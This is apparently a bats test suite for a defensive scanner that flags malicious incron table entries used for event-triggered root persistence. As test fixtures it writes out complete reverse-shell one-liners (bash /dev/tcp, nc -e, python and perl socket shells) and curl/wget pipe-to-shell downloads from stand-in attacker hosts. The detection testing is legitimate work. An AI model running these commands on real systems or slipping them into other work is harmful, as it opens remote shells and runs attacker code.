#!/usr/bin/env bats
# L2 bats functional tests for the incron-watchdog scan script.
#
# incrond runs the command in each incrontab line (`<path> <mask> <command>`)
# under /etc/incron.d and /var/spool/incron when the watched path receives a
# matching inotify event — an attacker can trigger their payload on demand by
# touching the watched path (T1546). A table file that is world-writable /
# non-root-owned, or whose command program is under a writable root or
# carries an injection pattern, is alert.
#
# Run with: bats packaging/test/L2-incron-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/incron-watchdog/systemd/incron-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    INCD="${TMP}/incron.d"; mkdir -p "${INCD}"
    TAB="${INCD}/nginx"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_INCRON_PROFILE="${PROFILE:-report}" \
    SELFDEF_INCRON_BASELINE="${BASELINE}" \
    SELFDEF_INCRON_DIRS="${DIRS_V:-$INCD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '/etc/nginx IN_MODIFY /usr/sbin/nginx -t\n' > "${TAB}"
}

@test "no incron tables → ok / no_incron" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_incron"'
    cap | grep -q '"severity":"ok"'
}

@test "benign incron table, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged incron table on second run → ok / incron_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"incron_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a command program under a writable root → alert / incron_suspicious" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY /tmp/.x\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"incron_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "an injection pattern in the command → alert" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable incron table → alert" {
    seed_benign
    run_wd
    chmod 0666 "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign incron table change → warn / incron_changed" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_CLOSE_WRITE /usr/sbin/nginx -s reload\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"incron_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign /usr-rooted command is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious command" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY /tmp/.x\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — incron inventory enumerates attacker-triggerable root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (wget-pipe-sh in command): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY wget -qO- http://attacker/p | sh\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in command): obfuscation → alert" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY echo YmFzaCAtaQ== | base64 -d | bash\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (command under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY /var/tmp/.attacker-payload\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (command under /dev/shm): tmpfs writable-root coverage" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY /dev/shm/.attacker-payload\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable incron table): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable table): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${TAB}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-incron -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): incron-watchdog does NOT refresh baseline on suspicious-command detection — alert STAYS until operator updates" {
    seed_benign
    run_wd
    printf '/etc/nginx IN_MODIFY /tmp/.x\n' > "${TAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"incron_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/incron.d + /var/spool/incron axes — suspicious command in EITHER → alert)" {
    INCD2="${TMP}/spool-incron"; mkdir -p "${INCD2}"
    seed_benign
    DIRS_V="${INCD} ${INCD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/etc/nginx IN_MODIFY /tmp/.evil-payload\n' > "${INCD2}/evil-tab"
    DIRS_V="${INCD} ${INCD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious command NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/etc/nginx IN_MODIFY /usr/sbin/nginx -t\n# /etc/nginx IN_MODIFY /tmp/.example-attacker\n' > "${TAB}"
    run_wd
    ! cap | grep -q '"event":"incron_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/etc/nginx IN_MODIFY curl -s http://attacker.com/p | bash\n' > "${TAB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in incron command: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. incron runs commands AS ROOT (system
    # tables) or AS THE USER (user tables) on every matching inotify
    # event (T1546 — Event Triggered Execution). Attacker may plant
    # an inotify watch on a routinely-modified file to fire the
    # callback as a recurring exec trigger. Locks the netcat axis on
    # the inotify-event-trigger root-exec persistence surface
    # alongside the other reverse-shell variants.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/etc/nginx IN_MODIFY nc -e /bin/sh 1.1.1.1 4444\n' > "${TAB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on incron command surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the incron
    # inotify-event-trigger root-exec persistence surface
    # (T1546 — incron runs commands AS ROOT (system tables) on
    # every matching inotify event — attacker plants watch on
    # routinely-modified file to fire recurring callback).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/etc/nginx IN_MODIFY python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${TAB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on incron command surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp incron command
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as dpkg/locale dependency. Locks perl axis on
    # T1546 incron inotify-event-trigger root-exec persistence —
    # attacker plants watch on routinely-modified file (e.g.
    # /etc/nginx, /var/log/auth.log) to fire planted perl rev-shell
    # on every operator-config-touch.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/etc/nginx IN_MODIFY perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${TAB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/etc/nginx IN_MODIFY bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${TAB}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-incron -- ')
    [ "${main_count}" = "1" ]
}
